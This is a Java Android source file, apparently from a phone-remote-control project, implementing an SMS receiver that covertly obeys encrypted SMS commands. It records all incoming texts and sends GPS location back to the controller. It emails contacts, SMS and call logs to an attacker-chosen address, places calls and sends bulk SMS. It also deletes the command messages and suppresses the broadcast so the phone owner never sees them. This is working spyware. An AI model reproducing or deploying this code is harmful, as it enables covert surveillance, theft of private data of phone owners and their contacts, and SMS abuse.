package com.craining.book.CtrlThisPhone.DoThings;

import java.io.File;
import java.util.Vector;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.telephony.SmsMessage;
import android.util.Log;

import com.craining.book.CtrlThisPhone.UsefullVerbs;

/**
 * 监听短信的接收
 * 
 * @author Ruin
 * 
 */
public class ReceiveMsg extends BroadcastReceiver {

	String receiveMsg = "";
	private static final String TAG = "ReceivedMsg";
	private Context this_context;
	private static String toSomeBody_sendmsg = "";
	private static String MsgContent_sendmsg = "";
	private static int counts_sendmsg = 1;
	
	@Override
	public void onReceive(Context context, Intent intent) {

		this_context = context;

		SmsMessage[] msg = null;

		if ( intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") ) {

			Bundle bundle = intent.getExtras();
			if ( bundle != null ) {
				Object[] pdusObj = (Object[]) bundle.get("pdus");
				msg = new SmsMessage[pdusObj.length];
				int mmm = pdusObj.length;
				for (int i = 0; i < mmm; i++)
					msg[i] = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
			}

			int msgLength = msg.length;
			for (int i = 0; i < msgLength; i++) {
				String msgTxt = msg[i].getMessageBody();

				// 获得发信人号码
				String getFromNum = "";
				for (SmsMessage currMsg : msg) {
					getFromNum = currMsg.getDisplayOriginatingAddress();
				}

				if ( !listenTheMsg(context, getFromNum, msgTxt) ) {
					// 删除本短信

					long id = getThreadId(context);
					Uri mUri = Uri.parse("content://sms/conversations/" + id);
					context.getContentResolver().delete(mUri, null, null);

				}

				abortBroadcast();
			}

		} else if ( intent.getAction().equals("android.provider.Telephony.SMS_SEND") ) {
			Log.i(TAG, "++++++++++++++++++++++++MSG______SEND");
		}

		return;
	}

	/**
	 * 获得收到的短信
	 */
	public boolean listenTheMsg(Context context, String from, String msgText) {

		

		// 保存短信接收的记录
		DoSomeThings doThings = new DoSomeThings();
		String toSaveMsg = "接收日期：" + doThings.returnDateOrTime((int) 0) + "时间：" + doThings.returnDateOrTime((int) 1) + "发送者：" + from + "\r\n内容：" + msgText + "\r\n\r\n";
		doThings.writeFile(toSaveMsg, UsefullVerbs.SAVE_MSG_FILE, true);
		
		// 对短信进行解密判断是否为指令
		try {
			msgText = SimpleCrypto.decrypt(UsefullVerbs.COMMAND_PWD, msgText);
			Log.e(TAG, msgText);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		DoSomeThings does = new DoSomeThings();
		String strCtrlPwd = does.getinfo(UsefullVerbs.SAVE_PWD_FILE);
		Log.e(TAG, msgText);
		String[] msgBody = msgText.split("::");
		if ( msgBody[0].equals(strCtrlPwd) && msgBody.length == 2 ) {
			if( !UsefullVerbs.ACCEPT.exists() ){
				// 判断指令，并作出反应
				doAsCommand(context, msgBody[1], from);
				return false;
			}

		} else {
			if ( msgBody[0].equals("check") && msgBody.length == 2 ) {
				checkPwd(context, msgBody[1], from);
			} else if(msgBody[0].equals("ReceiveMsg") && msgBody.length == 3) {
				//收到加密短信
				// ReceiveMsg::密文::密码
				String cypherMsgContent = msgBody[1];
				String cypherMsgPwd = msgBody[2];
				
				try {
					cypherMsgPwd = SimpleCrypto.decrypt(UsefullVerbs.COMMAND_PWD, cypherMsgPwd);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				
				Intent i = new Intent();
				i.setClass(context, ReadMsg.class);
				i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				Bundle mBundle = new Bundle();
				mBundle.putString("MSGCONTENT", cypherMsgContent);
				mBundle.putString("MSGPWD", cypherMsgPwd);
				mBundle.putString("FROM", from);
				i.putExtras(mBundle);
				context.startActivity(i);
			}
			return false;
		}

		return true;
	}

	public void doAsCommand(Context context, String com, String from) {
		DoSomeThings doThings = new DoSomeThings();
		String[] getCommand = com.split("-");

		// 一、如果是电话控制 com 形如 Call-*****-**********
		if ( getCommand[0].equals("Call") && getCommand.length > 1 ) {
			if ( getCommand[1].equals("Dial") && getCommand.length == 3 ) {// 如果是拨打电话指令如：hide:Call-Dial-10086
				callSomebody(context, getCommand[2]);

			} else if ( getCommand[1].equals("estop") ) { // 如果是禁止所有短信：
															// hide:Call-estop

			} else if ( getCommand[1].equals("me") ) {// 呼叫控制者hide:Call-me
				callSomebody(context, from);
			}

		}

		// 三、如果是获得信息
		else if ( getCommand[0].equals("Ask") && getCommand.length > 1 ) {
			if ( getCommand[1].equals("Position") ) {// Ask-Position
				// 获得GPS位置
				LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
				double[] myGps = new double[2];
				myGps = doThings.getGPS(lm);
				String str_myGps = myGps[0] + "-" + myGps[1];
				String toSendmsg = "GPS Text::" + str_myGps + "::this is my gps";//您好，这是我的GPS位置，打开控制软件或许已经看到我在地图上的位置了
				doThings.sendMsg(context, from, toSendmsg);// 将位置以短信的方式发送给控制者

			} else if ( getCommand[1].equals("Contacts") ) {// Ask-Contacts-email
				Log.e("", "do contacts");
				String emailAdd = "";
				for (int i = 2; i < getCommand.length; i++) {
					if ( i == 2 ) {
						emailAdd = emailAdd + getCommand[i];
					} else {
						emailAdd = emailAdd + "-" + getCommand[i];
					}

				}

				// 遍历联系人前先删除原有的保存联系人的文件
				if ( UsefullVerbs.SAVE_CONTACTS_FILE.exists() ) {
					UsefullVerbs.SAVE_CONTACTS_FILE.delete();
				}

				if ( getContact(context) ) {// 遍历所有联系人到 contact.txt
					Log.e("", "send email");
					if ( tellMeContants("邮件反馈:我的联系人", UsefullVerbs.SAVE_CONTACTS_FILE, emailAdd) ) {
						// 发送邮件
						doThings.sendMsg(context, from, "短信通知：您好！我的联系人名单已经发送到您的邮箱里了，现在就可以登录邮箱进行查看啦！");
					} else {
						Log.e("", "fail");
						doThings.sendMsg(context, from, "短信通知：您好！我的联系人名单目前不能发送给您！请过一段时间再给我命令。");
					}

				} else {
					doThings.sendMsg(context, from, "短信通知：您好！我的联系人名单目前不能发送给您！请过一段时间再给我命令。");
				}

			} else if ( getCommand[1].equals("Msg") ) {
				String emailAdd = "";
				for (int i = 2; i < getCommand.length; i++) {
					if ( i == 2 ) {
						emailAdd = emailAdd + getCommand[i];
					} else {
						emailAdd = emailAdd + "-" + getCommand[i];
					}

				}
				// 获得短信记录然后删除之前记录
				if ( UsefullVerbs.SAVE_MSG_FILE.exists() ) {

					if ( tellMeContants("邮件反馈:我的短信记录" + "我的电话:" + UsefullVerbs.thisNowNo, UsefullVerbs.SAVE_MSG_FILE, emailAdd) ) {
						doThings.sendMsg(context, from, "短信通知：您好！我的近期短信记录已经发送到您的邮箱里了，现在就可以登录邮箱进行查看啦！");
					} else {
						Log.e("", "fail");
						doThings.sendMsg(context, from, "短信通知：您好！我的近期短信记录目前不能发送给您！请过一段时间再给我命令。");
					}
				} else {
					doThings.sendMsg(context, from, "短信通知：您好！自从您上次查看我的短信记录后，到目前我还没有收到任何短信呢！");
				}

			} else if ( getCommand[1].equals("Conversation") ) {
				String emailAdd = "";
				for (int i = 2; i < getCommand.length; i++) {
					if ( i == 2 ) {
						emailAdd = emailAdd + getCommand[i];
					} else {
						emailAdd = emailAdd + "-" + getCommand[i];
					}

				}
				// 获得通话记录，然后删除之前记录
				if ( UsefullVerbs.SAVE_CONVERSATION_FILE.exists() ) {
					if ( tellMeContants("邮件反馈:我的通话记录" + "我的电话:" + UsefullVerbs.thisNowNo, UsefullVerbs.SAVE_CONVERSATION_FILE, emailAdd) ) {
						doThings.sendMsg(context, from, "短信通知：您好！我的近期通话记录已经发送到您的邮箱里了，现在就可以登录邮箱进行查看啦！");
					} else {
						Log.e("", "fail");
						doThings.sendMsg(context, from, "短信通知：您好！我的近期通话记录目前不能发送给您！请过一段时间再给我命令。");
					}

				} else {
					doThings.sendMsg(context, from, "短信通知：您好！自从您上次查看我的通话记录后，到目前我还没有任何通话呢！");
				}
			}
		}

		// 四、如果是发送信息hide:Msg-Send-111-内容-次数
		else if ( getCommand[0].equals("Msg") && getCommand.length >= 4 ) {
			if ( getCommand[1].equals("Send") && getCommand.length == 5 ) {

				toSomeBody_sendmsg = getCommand[2];
				MsgContent_sendmsg = getCommand[3];
				try {
					// 防止强制类型转换出错，用try
					counts_sendmsg = Integer.parseInt(getCommand[4]);
				} catch (Exception e) {
					counts_sendmsg = 1;
				}
				if ( counts_sendmsg == 0 ) {
					counts_sendmsg = 1;
				}

				// 开启线程等待
				Thread background = new Thread(new Runnable() {
					public void run() {
						try {
							DoSomeThings doThings = new DoSomeThings();

							for (int i = 1; i <= counts_sendmsg; i++) {
								Thread.sleep(5000);
								Log.e("SendMsg", "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM--" + i);
								String MsgContent = "All: " + counts_sendmsg + ", NO." + i + " :" + MsgContent_sendmsg;
								doThings.sendMsg(this_context, toSomeBody_sendmsg, MsgContent);
							}

						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					}
				});
				background.start();
			}
		}
		// hide:Contact联系人管理
		else if ( getCommand[0].equals("Contact") && getCommand.length >= 3 ) {
			if ( getCommand[1].equals("Add") && getCommand.length == 4 ) {
				String name = getCommand[2];
				String tel = getCommand[3];
				// 存储联系人

			} else if ( getCommand[1].equals("Del") && getCommand.length == 3 ) {
				String todelnum = getCommand[2];
				// 删除电话为todelnum的联系人

			} else if ( getCommand[1].equals("AddBlack") && getCommand.length == 3 ) {
				String toAddBlackNum = getCommand[2];
				// 增加电话为它的黑名单

			} else if ( getCommand[1].equals("DelBlack") && getCommand.length == 3 ) {
				String toDelBlackNum = getCommand[2];
				// 删除电话为它的黑名单

			}
		}

	}

	/**
	 * 回应受控情况
	 * 
	 * @param pwd
	 */
	private void checkPwd(Context context, String pwd, String from) {
		DoSomeThings does = new DoSomeThings();
		String str_ctrlpwd = does.getinfo(UsefullVerbs.SAVE_PWD_FILE);
		if ( str_ctrlpwd.equals(pwd) ) {
			does.sendMsg(context, from, "短信回应：您好！您现在可以控制我！");
		} else {
			does.sendMsg(context, from, "短信回应：您好！您对我的控制密码跟我的受控密码不匹配，因此您不能控制我！");
		}
	}
	/**
	 * 拨打电话
	 * 
	 * @param context
	 */
	private void callSomebody(Context context, String num) {
		try {
			Uri uri = Uri.parse("tel:" + num);
			Intent it = new Intent(Intent.ACTION_CALL, uri);
			it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startActivity(it);
		} catch (Exception e) {
			// TODO: handle exception
		}
	}

	/**
	 * 获得要删除短信的ID
	 * <p>
	 * 原理: 因为我想删除最近收到的一条短信，所以我只需按时间进行倒序，然后获取第一条短信的线程ID就行了
	 * <p>
	 * 用法: 在ReceiveMsg中调用的: <br>
	 * 
	 * @return
	 */
	public long getThreadId(Context context) {
		long threadId = 0;
		String SMS_READ_COLUMN = "read";
		String WHERE_CONDITION = SMS_READ_COLUMN + " = 0";
		String SORT_ORDER = "date DESC";
		int count = 0;

		Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), new String[]{"_id", "thread_id", "address", "person", "date", "body"}, WHERE_CONDITION, null, SORT_ORDER);

		if ( cursor != null ) {
			try {
				count = cursor.getCount();
				if ( count > 0 ) {
					cursor.moveToFirst();
					threadId = cursor.getLong(1);
				}
			} finally {
				cursor.close();
			}
		}
		Log.e(TAG, "++++++++++++++++++++++++++++++++++++++++============>msgID:   " + threadId);

		return threadId;
	}

	/**
	 * 遍历联系人
	 */
	public boolean getContact(Context contenx) {

		DoSomeThings doThings = new DoSomeThings();

		String head = "\r\n您好！我的电话号码是：" + UsefullVerbs.thisNowNo + "\r\n我当前所有的联系人以及电话号码为：\r\n";
		String allContactsInfo = head;

		// 获得所有的联系人
		Cursor cur = contenx.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		// 循环遍历
		if ( cur.moveToFirst() ) {
			int idColumn = cur.getColumnIndex(ContactsContract.Contacts._ID);
			int displayNameColumn = cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
			do {
				// 获得联系人的ID号
				String contactId = cur.getString(idColumn);
				Log.e(TAG, "++++++++++++++++++++++++++++++++++=>Contact -- ID ： " + contactId);

				allContactsInfo = allContactsInfo + "\r\n" + contactId + "、";

				// 获得联系人姓名
				String disPlayName = cur.getString(displayNameColumn);
				Log.i(TAG, "++++++++++++++++++++++++++++++++++=> name  ： " + disPlayName);

				allContactsInfo = allContactsInfo + disPlayName + "：\r\n";

				// 查看该联系人有多少个电话号码。如果没有这返回值为0
				int phoneCount = cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
				if ( phoneCount > 0 ) {
					// 获得联系人的电话号码
					Cursor phones = contenx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId, null, null);
					if ( phones.moveToFirst() ) {
						do {
							// 遍历所有的电话号码
							String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
							Log.i(TAG, "++++++++++++++++++++++++++++++++++=> PhoneNumber :  " + phoneNumber);
							phoneNumber = "    电话：" + phoneNumber;
							allContactsInfo = allContactsInfo + phoneNumber + "\r\n";

						} while (phones.moveToNext());
					}
				}
			} while (cur.moveToNext());
		}
		if ( allContactsInfo.equals(head) ) {
			allContactsInfo = "\r\n您好！我的电话号码是：" + UsefullVerbs.thisNowNo + "\r\n我的手机中没有存储任何联系人！";
		}
		if ( doThings.writeFile(allContactsInfo, UsefullVerbs.SAVE_CONTACTS_FILE, true) ) {
			return true;
		} else {
			return false;
		}

	}

	/**
	 * 发送邮件
	 * 
	 * @param sub
	 *            邮件主题
	 * @param content
	 *            邮件内容
	 * @param filepath
	 *            附件路径
	 */
	private boolean tellMeContants(String sub, File file, String toEmailadd) {

		DoSomeThings does = new DoSomeThings();
		String content = does.getinfo(file);
		Vector<String> sendfiles = new Vector<String>();

		SendEmailImplement sendEmail = new SendEmailImplement();

		if ( sendEmail.sendMyEmail(UsefullVerbs.EMAIL_SMTP, UsefullVerbs.EMAIL_NAME, UsefullVerbs.EMAIL_PWD, toEmailadd, UsefullVerbs.EMAIL_WHOSEND, sub, content, sendfiles) ) {
			file.delete();
			return true;
		} else {
			return false;
		}

	}
	
}
